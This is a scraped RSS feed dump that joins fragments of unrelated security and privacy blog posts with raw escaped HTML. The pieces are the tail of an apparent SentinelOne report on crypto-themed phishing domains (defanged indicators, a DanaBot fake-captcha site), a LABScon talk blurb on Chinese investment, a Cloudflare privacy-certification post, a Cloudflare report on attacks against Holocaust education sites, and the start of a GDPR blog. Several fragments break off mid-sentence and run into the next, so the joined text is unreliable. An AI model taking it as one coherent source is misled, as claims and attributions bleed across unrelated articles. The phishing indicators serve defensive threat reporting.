&lt;p&gt;In some cases, we’ve observed cryptocurrency themed projects seemingly acting as placeholders for future use, or direct pump-and-dump schemes. In one example, &lt;code&gt;buy-tanai[.]com&lt;/code&gt; was &lt;a href="https://pump.fun/coin/G8pMUeoRVVDQu2hJSzxNPBGWtgtt5BjQ9nCT2BmVpump" rel="noopener noreferrer" target="_blank"&gt;pitched&lt;/a&gt; as such: “&lt;i&gt;$TANA AI. Dawn&amp;#8217;s AI project, Tana is the first AI-powered LP and trading agent, now live on the Solana blockchain.”&lt;/i&gt;&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113623" style="width: 1516px;"&gt;&lt;img alt="" class="size-full wp-image-113623" height="338" src="https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun.jpg" width="1516" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113623"&gt;Tana AI (TANA) on Pump[.]fun&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The domain&lt;code&gt;buy-tanai[.]com&lt;/code&gt; currently displays default FASTPANEL landing pages, suggesting it — along with other similar domains — is being staged for future attacks. Since FASTPANEL-managed sites can be rapidly updated, these domains serve as adaptable templates for phishing campaigns.&lt;/p&gt;
&lt;p&gt;Notably, TANA AI (TANA) was launched by Dawn in mid-January to promote AI-driven trading and liquidity provision in the cryptocurrency market. Despite losing most of its initial value within days, the currency remains actively traded across multiple decentralized exchanges.&lt;/p&gt;
&lt;p&gt;Given the crypto-related nature of these domains, it is likely that threat actors are using them as flexible phishing infrastructure. By keeping them as blank templates, they can quickly modify hosted content to align with ongoing campaigns as needed.&lt;/p&gt;
&lt;h3&gt;Crimeware Relations&lt;/h3&gt;
&lt;p&gt;Several other domains share overlaps in both use and unique infrastructure details, yet they represent a fork from the previously described high-profile social media profile attacks, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dataoptimix[.]com&lt;/li&gt;
&lt;li&gt;gamecodestudios[.]com&lt;/li&gt;
&lt;li&gt;shortwayscooter[.]com&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The domain &lt;code&gt;shortwayscooter[.]com&lt;/code&gt; &lt;a href="https://x.com/JAMESWT_MHT/status/1883780543797723223" rel="noopener noreferrer" target="_blank"&gt;hosts&lt;/a&gt; fake captchas that deliver the DanaBot banking trojan. DataOptimix is branded as a generative AI solution, though there are few details about what the service does.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113622" style="width: 1474px;"&gt;&lt;img alt="" class="size-full wp-image-113622" height="1236" src="https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix.jpg" width="1474" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113622"&gt;DataOptimix&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h3&gt;Historical Connections&lt;/h3&gt;
&lt;p&gt;In mid-2024, a campaign used related infrastructure in similar phishing messages, including those which &lt;a href="https://www.sportskeeda.com/us/streamers/news-linus-sebastian-responds-linus-tech-tips-official-x-account-got-hacked" rel="noopener noreferrer" target="_blank"&gt;compromised the Linus Tech Tips&lt;/a&gt; Twitter account along with several other high profile users. At the time, @LinusTech had roughly 1.8million followers, which may represent the highest profile account successfully hijacked and linked to this actor.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113621" style="width: 852px;"&gt;&lt;img alt="" class="size-full wp-image-113621" height="1556" src="https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise.jpg" width="852" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113621"&gt;Linus Tech Tips Twitter compromise&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The cryptocurrency landscape offers financially-motivated threat actors multiple opportunities for profit and fraud. While marketing for coins and tokens has long been irreverent and meme-driven, recent developments have further blurred the line between legitimate projects and scams. &lt;/p&gt;
&lt;p&gt;A striking example occurred in January 2025, when the X account of the late crypto-enthusiast and antivirus founder John McAfee was reactivated to promote a new coin, &lt;a href="https://cryptoslate.com/john-mcafee-reborn-as-ai-memecoin-and-chatbot-with-27-million-market-cap/" rel="noopener noreferrer" target="_blank"&gt;$AIntivirus&lt;/a&gt;. The marketing style and brand voice of this purportedly legitimate token closely resemble tactics used in known scam campaigns, highlighting how easily crypto enthusiasts can be misled in an already murky ecosystem.&lt;/p&gt;
&lt;p&gt;To safeguard your X account, we strongly recommend using a unique password, enabling two-factor authentication (2FA), and avoiding credential sharing with third-party services. Be especially cautious of messages containing links to account alerts or security notices. Always verify URLs before clicking, and if a password reset is needed, initiate it directly through the official website or app rather than relying on unsolicited links.&lt;/p&gt;

Elly Rostoum reveals why.</description><content:encoded>&lt;p&gt;&lt;span style="letter-spacing: 0px;"&gt;Chinese foreign direct investment should trigger American national security concerns, but much of it doesn’t. In this ‘behind closed doors’ talk at LABScon 24, Elly Rostoum reveals why and what can be done to improve our understanding of the influence of Chinese FDI.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Chinese foreign direct investment (FDI) enabled the technology revolution in China and set China as a strategic competitor to the United States. It opened new global markets, redrew trade routes, tapped into intellectual property, allowed for opportunities in industrial espionage, reshaped supply chains, and allowed for technological breakthroughs in genomics, quantum computing, artificial intelligence, and other critical and emerging technologies that are quite simply re-imagining the world.&lt;/p&gt;
&lt;p&gt;But who exactly owns the Chinese firms undertaking this FDI?&lt;/p&gt;
&lt;p&gt;The research presented by &lt;a href="https://www.labscon.io/speakers/elly-rostoum/" rel="noopener" target="_blank"&gt;Elly Rostoum&lt;/a&gt; in this LABScon 2024 keynote address tracks the incorporation structures and ownership of the 672 Chinese firms undertaking FDI globally.&lt;/p&gt;
&lt;p&gt;Taking the audience on a journey from how Chinese FDI triggers &amp;#8211; and sometimes fails to trigger &amp;#8211;  American national security concerns to the complex ownership structure of Chinese businesses operating within the U.S., Elly Rostoum reveals how the Chinese government has been able to evade American national security reviews by instrumentalizing investment through 3rd &amp;amp; 4th+ level subsidiaries, private equity, and holding companies.&lt;/p&gt;
&lt;p&gt;While much policy and attention has been focused on the investments of Chinese state-owned enterprises, Elly Rostoum argues that the real threat is “within” and buried in the details: seemingly “American” businesses that are ultimately owned by Chinese investment companies.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;

So today, on Data Privacy Day (also known internationally as Data Protection Day), we’re happy to announce that we’re adding our fourth and fifth privacy validations, and this time, they are global firsts! Cloudflare is the first organisation to announce that we have been successfully audited against the brand new &lt;a href="https://www.globalcbpr.org/privacy-certifications/"&gt;&lt;u&gt;Global Cross-Border Privacy Rules (Global CBPRs) for data controllers and the Global Privacy Recognition for Processors (Global PRP)&lt;/u&gt;&lt;/a&gt;. These validations demonstrate our support and adherence to global standards that provide for privacy-respecting data flows across jurisdictions. Organizations that have been successfully audited will be formally certified when the certifications officially launch, which we expect to happen later in 2025. &lt;/p&gt;&lt;p&gt;Our participation in the Global CBPRs and Global PRP joins our roster of privacy validations: we were one of the first cybersecurity organizations to certify to the international privacy standard &lt;a href="https://blog.cloudflare.com/iso-27701-privacy-certification/"&gt;&lt;u&gt;ISO 27701:2019&lt;/u&gt;&lt;/a&gt; when it was published, and in 2022 we also certified to the cloud privacy certification, &lt;a href="https://www.cloudflare.com/trust-hub/compliance-resources/iso-certifications/"&gt;&lt;u&gt;ISO 27018:2019&lt;/u&gt;&lt;/a&gt;. In 2023, we added our third privacy validation, undergoing a review by an independent monitoring body in the European Union (EU) and declared to be adherent to the first official GDPR code of conduct — &lt;i&gt;the &lt;/i&gt;&lt;a href="https://blog.cloudflare.com/cloudflare-official-gdpr-code-of-conduct/"&gt;&lt;i&gt;&lt;u&gt;EU Cloud Code of Conduct&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why this matters to Cloudflare customers&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-this-matters-to-cloudflare-customers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Taking these privacy certifications together, Cloudflare demonstrates that we are meeting key official privacy validations in 39 jurisdictions around the world, from Australia and Austria to Sweden and the United States. An additional four jurisdictions (United Kingdom, Bermuda, Mauritius, and the Dubai International Finance Centre) are also in the process of joining and recognising the Global CBPR certifications. That's important for Cloudflare customers as it provides reassurance that the privacy practices we have built are recognised by governments around the world.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2RFlkr3Wht9Gu34lv2xxN9/8f3c8e5dc23963614d275dab085cd8ce/unnamed.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;What is the Global CBPR System?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-is-the-global-cbpr-system"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In the last three years, governments across the world have been busy preparing two brand-new international privacy standards. A major milestone was achieved on April 30, 2024 when &lt;a href="https://www.globalcbpr.org/global-cbpr-forum-announces-the-establishment-of-the-global-cbpr-and-global-prp-systems-and-welcomes-new-global-cape-participants/"&gt;&lt;u&gt;the Global CBPR System was established&lt;/u&gt;&lt;/a&gt;. The CBPRs are a voluntary, enforceable, international, accountability-based system that facilitates privacy-respecting data flows among members’ economies. They provide a baseline level of privacy protection for consumers through a set of rules on how to handle people’s personal information. This facilitates the free flow of data by upholding consumer privacy across participating members, despite each jurisdiction having their own individual data protection laws.&lt;/p&gt;&lt;p&gt;The CBPR System was developed by the &lt;a href="https://www.globalcbpr.org/about/membership/"&gt;&lt;u&gt;Global CBPR Forum&lt;/u&gt;&lt;/a&gt;, an intergovernmental forum between the governments of Australia, Canada, Japan, Republic of Korea, Mexico, Philippines, Singapore, Chinese Taipei, and the United States. The United Kingdom is also an associate member of the CBPR Forum, as are Bermuda, Mauritius, and the Dubai IFC, signifying their intent to join as full members in the future.&lt;/p&gt;&lt;p&gt;Over the last year, we have been busy preparing for the launch of the Global CBPR System. On May 1, 2024 — the very first day after the establishment of the system — Cloudflare applied to join. And we have now achieved the major milestone of successfully completing audits against the requirements, meaning we expect to be the first organization in the world to be newly certified to the Global CBPR system, as well as the related Global Privacy Recognition for Processors, when companies can officially be certified, which is expected later in 2025.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;What the Global CBPR System covers&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-the-global-cbpr-system-covers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The Global CBPR System contains a detailed list of fifty requirements that organizations must meet in order to be certified under the scheme. The requirements derive from the nine &lt;b&gt;Global CBPR Privacy Principles&lt;/b&gt;, which are consistent with the core principles of the &lt;a href="https://www.oecd.org/"&gt;&lt;u&gt;Organisation for Economic Co-operation and Development (OECD)&lt;/u&gt;&lt;/a&gt; &lt;a href="https://www.oecd.org/en/publications/2002/02/oecd-guidelines-on-the-protection-of-privacy-and-transborder-flows-of-personal-data_g1gh255f.html"&gt;&lt;u&gt;Guidelines on the Protection of Privacy and Trans-Border Flows of Personal Data&lt;/u&gt;&lt;/a&gt;. The fifty requirements cover how organizations should collect, manage, and safeguard personal information in their custody. Organizations must meet every one of the fifty requirements in order to be Global CBPR certified. The nine principles underlying the requirements are:&lt;/p&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;Preventing Harm&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Notice&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Collection Limitation&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;Uses of Personal Information&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Choice&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Integrity of Personal Information&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;Security Safeguards&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Access and Correction&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Accountability&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;The nine Global CBPR Privacy Principles&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;The Global CBPR certification covers the handling of personal information controlled by the organization, such as the personal details of customers, employees, and job applicants. For Cloudflare, this also includes network information — our observations about how our global cloud platform handles server, network, or traffic data generated by Cloudflare in the course of providing our services.&lt;/p&gt;&lt;p&gt;The related Global Privacy Recognition for Processors (PRP) certification covers the handling of personal information processed by the organization on behalf of a different organization, usually their customer. The eighteen requirements of the PRP relate to the two privacy principles most relevant when processing this information on behalf of another organization: &lt;i&gt;Security Safeguards and Accountability&lt;/i&gt;. For Cloudflare, this covers the processing of data pursuant to the &lt;a href="https://www.cloudflare.com/cloudflare-customer-dpa/"&gt;&lt;u&gt;Data Processing Addendum&lt;/u&gt;&lt;/a&gt; we sign with all of our customers, chiefly, the Customer Content flowing across our network and the Customer Logs generated by those data flows. Organizations must meet every one of the eighteen requirements in order to be Global PRP certified.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;A deeper dive into some of the requirements of the Global CBPRs&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#a-deeper-dive-into-some-of-the-requirements-of-the-global-cbprs"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;As noted, the key requirements of the Global CBPRs and the Global PRP cover the well-known data protection principles of notice, choice, collection limitation (data minimization), the right of data subject access and correction, providing adequate security, preventing harm, integrity of personal information, accountability, and uses of personal information. There are dozens of requirements that cover these principles, so we’ll just touch on a few of them here.&lt;/p&gt;&lt;p&gt;Let’s first look at the principle of notice. One of the more obvious requirements from the CBPRs is question 1:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Do you provide clear and easily accessible statements about your practices and policies that govern the personal information described above (a privacy statement)?&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Being transparent about the collection and use of personal information is a key principle of privacy and data protection, and transparency is one of Cloudflare’s core commitments. Documenting our practices and policies in regard to how we use personal information allows individuals to decide if they want to provide their information, and that’s why it’s best practice for the privacy notice to be available and visible at the time the information is being collected. Indeed, this concept of providing notice is clear from &lt;a href="https://eur-lex.europa.eu/eli/reg/2016/679/oj/eng#art_13"&gt;&lt;u&gt;Article 13 of the EU’s GDPR&lt;/u&gt;&lt;/a&gt;. Cloudflare meets this CBPR requirement by providing a clear and accessible privacy notice visible from the footer of each page on our website. We also provide a link to the notice when we collect personal data such as through a form on a webpage.&lt;/p&gt;&lt;p&gt;In terms of how we use personal information, question 8 asks:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Do you limit the use of the personal information you collect (whether directly or through the use of third parties acting on your behalf) as identified in your privacy statement?&lt;/i&gt;&lt;/p&gt;&lt;p&gt;It has long been a commitment of Cloudflare’s that we only use the personal information we collect for the purposes of providing the services we offer. Our business is built on providing customers with the tools to protect their network applications and to make them faster, more secure, more reliable, and more private. In our &lt;a href="https://www.cloudflare.com/privacypolicy/"&gt;&lt;u&gt;Privacy Policy&lt;/u&gt;&lt;/a&gt;, we commit that we will “only share or otherwise disclose your personal information as necessary to provide our Services or as otherwise described in this Policy, except in cases where we first provide you with notice and the opportunity to consent.” And we maintain internal documentation (in keeping with the CBPR’s accountability principle) to document the data we are processing and the purposes for which we process it.&lt;/p&gt;&lt;p&gt;Another key set of requirements in both the Global CBPRs and the Global PRP have to do with security safeguards. CBPR requirement question 27 asks:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Describe the physical, technical and administrative safeguards you have implemented to protect personal information against risks such as loss or unauthorized access, destruction, use, modification or disclosure of information or other misuses?&lt;/i&gt;&lt;/p&gt;&lt;p&gt;The similar requirement in the Global PRP is question 2: &lt;/p&gt;&lt;p&gt;&lt;i&gt;Describe the physical, technical and administrative safeguards that implement your organization’s information security policy.&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Cloudflare has implemented an information security program in accordance with the ISO/IEC 27000 family of standards. Details of Cloudflare’s security program are documented in Annex 2 (“Technical and Organizational Security Measures”) of Cloudflare's &lt;a href="https://www.cloudflare.com/cloudflare-customer-dpa/"&gt;&lt;u&gt;Customer Data Processing Addendum&lt;/u&gt;&lt;/a&gt;, including the physical, technical and administrative safeguards implemented to protect personal information.&lt;/p&gt;&lt;p&gt;Related to the Accountability principle, question 46 asks:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Do you have mechanisms in place with personal information processors, agents, contractors, or other service providers pertaining to personal information they process on your behalf, to ensure that your obligations to the individual will be met? &lt;/i&gt;&lt;/p&gt;&lt;p&gt;When we have vendors who handle any of our, or our customers’, personal information, we require them to sign a Data Processing Addendum with us. This ensures the commitments we make to our customers in our customer agreements in turn flow through to our vendors, including the security requirements — holding them, and us, accountable.&lt;/p&gt;
          &lt;div&gt;

          &lt;/div&gt;
        &lt;p&gt;We are excited about the launch of the Global CBPR certifications, expected later in 2025, and we are proud that on this Data Privacy Day, we can yet again demonstrate our commitment to universally held principles for protecting the privacy of personal data.&lt;/p&gt;&lt;p&gt;You can find more about the Global CBPR System, the Global PRP, download a full copy of the requirements, and keep up to date with related news at &lt;a href="https://www.globalcbpr.org/"&gt;&lt;u&gt;globalcbpr.org&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;For the latest information about our certifications, please visit our &lt;a href="https://www.cloudflare.com/trust-hub/compliance-resources/"&gt;&lt;u&gt;Trust Hub&lt;/u&gt;&lt;/a&gt;.

This tragic chapter in human history serves as a stark reminder of the catastrophic consequences of prejudice and extremism. &lt;/p&gt;&lt;p&gt;The United Nations General Assembly designated January 27 — the anniversary of the liberation of &lt;a href="https://en.wikipedia.org/wiki/Auschwitz_concentration_camp"&gt;&lt;u&gt;Auschwitz-Birkenau&lt;/u&gt;&lt;/a&gt; —  as International Holocaust Remembrance Day. This year, we commemorate the 80th anniversary of the liberation of this infamous extermination camp.&lt;/p&gt;&lt;p&gt;As the world reflects on this dark period, a troubling resurgence of antisemitism underscores the importance of vigilance. This growing hatred has spilled into the digital realm, with cyberattacks increasingly targeting Jewish and Holocaust remembrance and educational websites — spaces dedicated to preserving historical truth and fostering awareness.&lt;/p&gt;&lt;p&gt;For this reason, here at Cloudflare, we began to publish annual reports covering cyberattacks that target these organizations. These cyberattacks include &lt;a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/"&gt;&lt;u&gt;DDoS attacks&lt;/u&gt;&lt;/a&gt; as well as &lt;a href="https://www.cloudflare.com/learning/bots/what-is-a-bot/"&gt;&lt;u&gt;bot&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.cloudflare.com/en-gb/learning/security/what-is-web-application-security/"&gt;&lt;u&gt;application attacks&lt;/u&gt;&lt;/a&gt;. The insights and trends are based on websites protected by Cloudflare. This is our fourth report, and you can view our previous Holocaust Remembrance Day blogs &lt;a href="https://blog.cloudflare.com/tag/holocaust/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;

          &lt;p&gt;At Cloudflare, we are proud to support these vital organizations through &lt;a href="https://www.cloudflare.com/en-gb/galileo/"&gt;&lt;u&gt;Project Galileo&lt;/u&gt;&lt;/a&gt;, an initiative providing free security protections to vulnerable groups worldwide. If you or your organization could benefit from this program, consider applying today to help protect these essential platforms and the invaluable work they do.&lt;/p&gt;

Muzeon faced significant cyberattacks that impacted their website’s performance and hindered operations before using Cloudflare.&lt;/p&gt;&lt;p&gt;As part of Project Galileo, Muzeon implemented Cloudflare's &lt;a href="https://www.cloudflare.com/en-gb/ddos/"&gt;&lt;u&gt;DDoS mitigation&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/en-gb/application-services/products/waf/"&gt;&lt;u&gt;Web Application Firewall (WAF)&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/application-services/products/dns/"&gt;&lt;u&gt;Managed DNS&lt;/u&gt;&lt;/a&gt;, and other services. These measures drastically reduced the attacks and allowed Muzeon to focus on its important mission of storytelling and preserving cultural heritage. &lt;/p&gt;&lt;p&gt;Cloudflare’s solutions not only protected their digital infrastructure but also freed up time for Muzeon to expand its interactive exhibits, ensuring they could continue sharing their essential work globally. You can read more about this case study &lt;a href="https://www.cloudflare.com/en-gb/case-studies/muzeon/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;

            &lt;h2&gt;Significant rise in antisemitism around the world&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#significant-rise-in-antisemitism-around-the-world"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Following the October 7, 2023, &lt;a href="https://en.wikipedia.org/wiki/October_7_Hamas-led_attack_on_Israel"&gt;&lt;u&gt;Hamas-led attack&lt;/u&gt;&lt;/a&gt; on Israel, there has been a &lt;a href="https://en.wikipedia.org/wiki/Antisemitism_during_the_Israel%E2%80%93Hamas_war"&gt;&lt;u&gt;surge in global antisemitic incidents&lt;/u&gt;&lt;/a&gt;. In the &lt;a href="https://www.adl.org/resources/press-release/over-10000-antisemitic-incidents-recorded-us-oct-7-2023-according-adl"&gt;&lt;u&gt;U.S. alone&lt;/u&gt;&lt;/a&gt; there have been more than 10,000 antisemitic incidents from October 7, 2023 to September 24, 2024, representing an over 200-percent increase compared to the incidents reported during the same period a year before. As we’ve seen, the digital world is often a mirror to the real world. As a result, it is not surprising that websites dedicated to sharing information about the Holocaust, as well as Jewish memorial and education platforms, are now increasingly being targeted online. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Cyberattacks against Jewish and Holocaust educational websites &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberattacks-against-jewish-and-holocaust-educational-websites"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;For the years 2020, 2021, and 2022, the number of cyberthreats targeting Holocaust and Jewish educational and memorial websites protected by Cloudflare was, on average, 736,339 malicious HTTP requests annually.&lt;/p&gt;&lt;p&gt;After the October 7 Hamas-led attack, cyberattacks skyrocketed. In 2023, the amount of blocked HTTP requests surged by 872% to 35.7 million compared to 2022. Most of these cyberattacks occurred after October 7, 2023. &lt;/p&gt;&lt;p&gt;In 2024, the number of blocked HTTP requests exceeded 47 million — representing a 30% increase compared to 2023. Over 3 out of every 100 HTTP requests towards Holocaust and Jewish memorial and education websites protected by Cloudflare were malicious and blocked. &lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by year&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In the fourth quarter of 2023, the volume of malicious requests exceeded 27 million. Throughout the first three quarters of 2024, we saw a gradual decrease in the quantity of malicious requests. But in the fourth quarter of 2024, cyberattacks spiked by 33%, to 36 million requests, following the one-year anniversary of the October 7 assault.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1YFVY3jTbMYsgbenBdor1P/6634fdf6edce5a5f3d44f34fdf017b3d/BLOG-2659_4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by quarter&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Breaking down the quarters into months, we can see an initial peak in October 2023 after the October 7 Hamas-led attack. The volume of cyberattacks remained elevated during November and December 2023.&lt;/p&gt;&lt;p&gt;Afterward, as we entered 2024, the quantity and percentage of cyberattacks against these websites significantly decreased. In November, over a third (34%) of all requests towards these websites were blocked, with over 36 million requests blocked that month alone.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5JGzGCm49GBBZMYfriSTpl/1f47b7b90bb5607461216fd2788c2f34/BLOG-2659_5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by month&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;

          &lt;/div&gt;
          &lt;p&gt;On the International Holocaust Remembrance Day, we reflect on the importance of standing against both antisemitism and cyber threats — issues that have escalated since the October 7, 2023, Hamas-led attack. &lt;/p&gt;&lt;p&gt;At Cloudflare, we are unwavering in our commitment to create a safer, more inclusive Internet. The rise in antisemitism has made it even more critical to protect educational websites and communities from harmful cyber attacks. We invite everyone to join us in this fight. Even with our &lt;a href="https://www.cloudflare.com/en-gb/plans/"&gt;&lt;u&gt;free plan&lt;/u&gt;&lt;/a&gt;, we offer strong security and performance, ensuring that vital resources and websites remain safe and accessible.

We recognise the visible and consumer-facing aspects of the General Data Protection Regulation in our everyday lives – when consumers exercise their right to withdraw consent to their data being processed via ‘opt out’ or ‘unsubscribe’ buttons, for example. What’s less evident is whether organisations are keeping their practices fully up to date and in line with the GDPR and other applicable data protection laws. For instance: So, how sure are you that your organisation is fully compliant with the relevant data protection legislation? In this blog ‘Once compliant’ does not mean ‘still compliant’ &lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/what-it-takes-to-be-your-organisations-dpo-or-data-privacy-lead"&gt;What It Takes to Be Your Organisation’s DPO or Data Privacy Lead&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;‘GDPR’ has become a familiar term.&lt;/p&gt;



&lt;p&gt;We recognise the visible and consumer-facing aspects of the &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;General Data Protection Regulation&lt;/a&gt; in our everyday lives – when consumers exercise their right to withdraw consent to their data being processed via ‘opt out’ or ‘unsubscribe’ buttons, for example.&lt;/p&gt;



&lt;p&gt;What’s less evident is whether organisations are keeping their practices fully up to date and in line with the GDPR and other applicable data protection laws. For instance:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Since adding unsubscribe buttons, those same organisations may have purchased marketing email lists without confirming the &lt;a href="https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; under which the personal data was collected and sold.&lt;/li&gt;



&lt;li&gt;Where the organisation has bought a marketing list, did it screen that list against its list of people who have previously opted out, so that it removes those individuals from the purchased list before starting to market to them?&lt;/li&gt;



&lt;li&gt;Since the EU GDPR was adopted in 2016 and became enforceable from 2018, we’ve had the &lt;a href="https://www.itgovernance.co.uk/dpa-2018" rel="noreferrer noopener" target="_blank"&gt;DPA (Data Protection Act) 2018&lt;/a&gt; and Brexit in the UK.&lt;/li&gt;



&lt;li&gt;More than 20 articles have been withdrawn from the EU GDPR to make the UK GDPR, and the DPA 2018 has been amended to be read in conjunction with the UK GDPR.&lt;/li&gt;
&lt;/ul&gt;







&lt;p&gt;So, how sure are you that your organisation is fully compliant with the relevant data protection legislation?&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Once-compliant-does-not-mean-still-compliant"&gt;‘Once compliant’ does not mean ‘still compliant’&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Data-protection-is-international"&gt;Data protection is international&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Guiding-others-towards-compliance"&gt;Guiding others towards compliance&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Data-breach-management"&gt;Data breach management&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Knowledge-skills-and-competence"&gt;Knowledge, skills and competence&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Once-compliant-does-not-mean-still-compliant"&gt;‘Once compliant’ does not mean ‘still compliant’&lt;/h2&gt;



&lt;p&gt;If you’re anything less than 100% sure, there’s a fair chance that someone, somewhere, has assumed that nothing has changed internally or within the law.&lt;/p&gt;



&lt;p&gt;Just because you sought expert opinion on the matter a few years ago doesn’t mean you’re in the clear. ‘Once compliant’ doesn’t mean ‘still compliant’.&lt;/p&gt;



&lt;p&gt;Previous decisions made – like not having to appoint a &lt;a href="https://www.itgovernance.co.uk/data-protection-officer-dpo-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;DPO (data protection officer)&lt;/a&gt;, or not needing to conduct a &lt;a href="https://www.itgovernance.co.uk/privacy-impact-assessment-pia" rel="noreferrer noopener" target="_blank"&gt;DPIA (data protection impact assessment)&lt;/a&gt; – need to be kept under review.&lt;/p&gt;



